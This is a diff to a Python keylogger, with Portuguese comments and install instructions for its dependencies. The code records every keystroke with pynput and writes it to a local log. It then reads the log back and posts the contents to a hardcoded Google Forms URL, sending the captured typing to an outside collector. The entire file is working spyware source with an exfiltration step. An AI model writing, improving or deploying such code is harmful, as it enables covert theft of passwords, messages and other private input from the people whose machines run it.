@@ -1,15 +1,19 @@
+#=====================ATEMÇÂO=====================
+#Caso vc tenha bloblemas user os comandos a baixo
+#sudo apt install python3-pip
+#pip3 install pynput
+#pip3 install requests
+#=================================================
+
 from pynput.keyboard import Listener
-import subprocess
 import requests
 import json
-import os 
 
 #definir a localização do arquivo de log
-logFile = "/home/znt/scrips/log.txt"
-
+logFile = "/home/znt/Projetos_python/keylogger_python/log.txt"
 
 def escreva(Letra):
-
+	
 	# Aqui como viu e um tradutor de letra,no caso as abaixo
 
 	traduzir = {
@@ -26,6 +30,10 @@ def escreva(Letra):
 		'Key.ctrl': ' ',
 		'Key.ctrl_l': 'ctrl+',
 		'Key.ctrl_r': 'ctrl+',
+		'Key.up': '',
+		'Key.left': '',
+		'Key.down': '',
+		'Key.right': '',
 	}
 
 	# Aqui vamos converter as letras para strings
@@ -40,15 +48,16 @@ def escreva(Letra):
 
 	with open(logFile, "a") as n:
 		n.write(escrita)
-
-		arquivo = open('/home/znt/Documentos/log.txt', 'r')
-		for linha in arquivo:
-			print(linha)
-		arquivo.close()
 		
-		payload = {'entry.722472479': linha}
+	#Aqui e responsavel por enviar tudo para o site
+	arquivo = open('/home/znt/Projetos_python/keylogger_python/log.txt', 'r')
+	for linha in arquivo:
+		print(linha)
+	arquivo.close()
+	
+	payload = {'entry.722472479': linha}
 
-		r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdPA5fhRbhgxWwNyNUdY7HcuK02kHyuT2IPwBy4kEuyvHn05w/formResponse", data=payload)
+	r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdPA5fhRbhgxWwNyNUdY7HcuK02kHyuT2IPwBy4kEuyvHn05w/formResponse", data=payload)
 
 # E esse roda o keylogger
 with Listener(on_press=escreva) as x:
